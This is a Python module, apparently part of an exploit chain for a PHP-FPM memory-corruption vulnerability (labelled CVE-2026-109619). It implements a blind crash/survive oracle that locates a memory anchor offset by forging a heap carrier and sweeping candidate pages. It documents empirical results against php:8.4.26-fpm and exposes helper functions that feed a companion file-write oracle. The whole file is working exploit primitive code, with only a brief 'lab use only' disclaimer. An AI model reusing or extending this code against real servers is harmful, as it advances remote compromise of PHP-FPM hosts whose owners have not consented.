#!/usr/bin/env python3
# INDEX: black-box X=(d_choff-carrier_base) PRE-FILTER via crash/survive with a benign in-carrier AIM; ps_files-independent, prunes X to a small survivor SET (has false-survives over a wide window), disambiguated by the file-write | fpm | needs an X window, no gdb/leak/ps_files
"""Blind X-anchor locator by a crash/survive signal (CVE-2026-109619).

Companion to blind_anchor_oracle (which locates X via the file-write signal and so
needs ps_files's residue known) and blind_psfiles_oracle (which locates ps_files but
needs X known). Those two are the two 1-D slices of the one 2-D exact oracle
fire(X, residue); taken alone they are circular. This module breaks the circularity:
it locates X WITHOUT knowing ps_files, so the pair is found as two 1-D sweeps (sum of
windows) rather than a 2-D product.

MECHANISM (theorized, empirically consistent): aim the forge's push at a BENIGN slot
INSIDE the carrier itself (fakee->data[aim] for a tiny aim, which falls just above
fakee in the carrier's own scratch) rather than at ps_files. Then:
  * X == X*  : the carrier's byte0 lands at d_choff, d->last redirects to fakee, the
               push writes a chunk pointer into our own carrier scratch -> WORKER
               SURVIVES (no file: ps_files untouched, real session flushes normally).
  * X != X*  : byte0 misses d_choff, d->last stays stale, the reused var_push derefs
               garbage -> SIGSEGV, worker respawns (PID changes).
The benign AIM depends only on x (not on ps_files), so survive<->X* holds with NO
ps_files knowledge. This is a DIFFERENT probe from the zero-carrier length-bsearch that
blind_anchor_oracle refutes (that one never redirects, so it always crashes); here the
redirect lands and the push is deliberately steered somewhere harmless.

RESULT (empirical, php:8.4.26-fpm lab/fpmfire, fresh-container-per-probe): this signal is
a PRE-FILTER, not a unique locator. A narrow 5-page window is clean (survive only at X*=
0x147, crash at 0x145/0x146/0x148/0x149), BUT a wide window (0x140..0x150) ALSO survives
at 0x142/0x143/0x144 -- FALSE survives where the benign push happens to land on dead
scratch through the un-redirected stale d->last (mechanism: empirical, not explained).
So over a realistic window the sweep yields a SMALL SET of surviving X candidates (here
4), of which only the true X* produces a file-write under the ps_files residue sweep. Use
`x_survivors` to get the set and disambiguate each by the exact file-write oracle; only a
narrow (<=~2-page) prior lets a single survivor stand in for X* directly.

Pure stdlib, python3 -I safe. Lab/analysis use only, systems you own.
"""
from __future__ import annotations

from primitives.oracles.blind_anchor_oracle import ARM_DELTA, aim_for, forge_carrier  # noqa: F401

PAGE = 0x1000


def benign_residue(x, *, arm_delta=ARM_DELTA, aim=2):
    """RESIDUE making aim_for(x, .) == `aim` (a tiny positive slot), so the push lands at
    fakee->data[aim] = carrier offset (x - arm_delta) + 0x10 + 8*aim -- inside the carrier
    scratch, just above fakee. ps_files-INDEPENDENT (no ps_files term)."""
    return aim * 8 + x - arm_delta + 0x10


def _ordered(pages, center):
    cand = list(pages)
    if center is not None:
        cand.sort(key=lambda p: abs(p - center))
    return cand


def x_survivors(probe_survive, pages, *, center=None, aim=2, stop_after=None):
    """All X candidates (byte offsets) in `pages` that SURVIVE the benign-AIM forge --
    the pre-filtered set containing X* plus any false-survives. probe_survive(x, residue)
    -> True iff the worker survived AND wrote no file. `stop_after` caps the collected
    survivors (None = scan the whole window). Scans outward from `center` if given."""
    out = []
    for pg in _ordered(pages, center):
        x = pg * PAGE
        res = benign_residue(x, aim=aim)
        try:
            forge_carrier(x, res)       # reject x whose carrier/fakee is out of bounds
        except ValueError:
            continue
        if x > PAGE and probe_survive(x, res):
            out.append(x)
            if stop_after and len(out) >= stop_after:
                break
    return out


def sweep_x_survive(probe_survive, pages, *, center=None, aim=2):
    """First surviving X candidate (byte offset) or None. VALID as X* only for a narrow
    (<=~2-page) prior; over a wider window use `x_survivors` + file-write disambiguation,
    since the benign-AIM survive signal has false positives (see module docstring)."""
    got = x_survivors(probe_survive, pages, center=center, aim=aim, stop_after=1)
    return got[0] if got else None
